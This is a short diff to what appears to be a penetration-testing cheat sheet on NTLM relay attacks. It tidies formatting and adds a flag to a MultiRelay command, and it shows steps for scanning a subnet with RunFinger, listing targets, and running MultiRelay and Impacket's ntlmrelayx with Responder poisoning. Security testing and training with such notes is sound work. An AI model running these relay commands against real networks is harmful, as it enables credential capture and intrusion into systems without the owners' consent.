@@ -12,11 +12,11 @@ python RunFinger.py -i 192.168.0.0/24
 ```
 2. Configure Impacket’s NTLMrelayx to target those systems
 ```
-echo "IP"  >> targets.txt**
+echo "IP"  >> targets.txt
  ```   
  ```
- python MultiRelay.py -t <target_machine_IP> -u ALL
- ntlmrelayx.py -tf targets.txt --smb2support**
+ python MultiRelay.py -t <target_machine_IP> -u ALL -d
+ ntlmrelayx.py -tf targets.txt --smb2support
  ```
 3. Disable SMB and HTTP response poisoning in Responder and launch
 ```
